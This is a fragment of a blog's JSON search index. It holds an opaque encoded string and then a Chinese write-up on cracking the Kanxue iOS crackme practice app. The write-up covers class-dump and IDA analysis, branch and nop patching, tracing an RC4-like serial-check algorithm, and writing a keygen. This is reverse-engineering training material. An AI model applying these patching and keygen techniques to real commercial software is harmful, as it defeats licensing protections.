5Poh7x8QyJsCSnbStPzKS58cZq3hWFvRvHtrtasZfwFU4oXr3Fz0Ie5QdjA281xTlslGg4lofm71Iy0PDR46EWQnXPBtkKspMYNIz2wwOFaQNcmbseO9ysQ1vIRDX6bE6LLZSRwc4PrhrDS4c4i80ndLC8jgkR2OBBfTYeOGYz6+ksPg3DmAHy/zDCp2iJjQKI0jpKESdWAvRf6m/dD7NfU0qiHyUiHVu8LbEyclofH3ANp2PvlrAUdXb8KGHbh1XNt3h26Uodz+nupx1oVGC4poWJnGiVSM8Xzi9NFwM2KHLLk/ccYuvlrQwXswYwrRWjt3vzACrScKX10DQcWMmyzXS5wA70WxFJj2Ee9SR3m/p6vgsEmWKFJnTp14GbA+WPFhK8HHIH3UH7m64vxmiZB3a4IpnfK9JPXFdNweDaUl8k+PZYvKS8KP5vn95qz6qdck8DGBlLlG92xwlXp3elr0JJ3B/lCZET2JwxXpICXXAbnAGmY4YHzHPey86W7JCJadKY4BF0aIl+6kNywW8O1ERTlrZBPnx7ibZHH8FEVzbqzgRAccaj5HKmWAJnBaFtXF8BvAG9oHyEg9J1bhid4lO24scr0zdz2J0yIWzG5jM1QIDdF8HfmKEBzXj1fL/2MgWLfUofDBWmsjnn5Rjj7dOMTkLr/60gNHUsUzdYjOAM11uHlG3TF3Xfc2ipZCP9513M+hNlkAb8UMCyLlJf95x4aqn20+7JrzJ6wPMM0zOEuFhZ7VlCMB08nMNSm4+nWR5tohk96RQIC+QkouN4GwQ7N2eYgeiqVtWHklcawLgSJpjWekXWodDX6dyvka3uVRlDmv6Seu1kYPZ1YOuKruO2/VkLvQjru3tnPCWok4NF/bvnQlXX2xQ3rHWHuEUh4cUV/cen2SAOwbc00/XHu2QCdzO6ou9FsCdSOmcfiOjYipMiKq3yBiIrp/zVfd4RlItySSYB6vkkixtXYGf8dml8SLJz0cJOZRiAAvX5Lb8uYV+sSKTsA==","tags":[{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"crackme","slug":"crackme","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"}]}]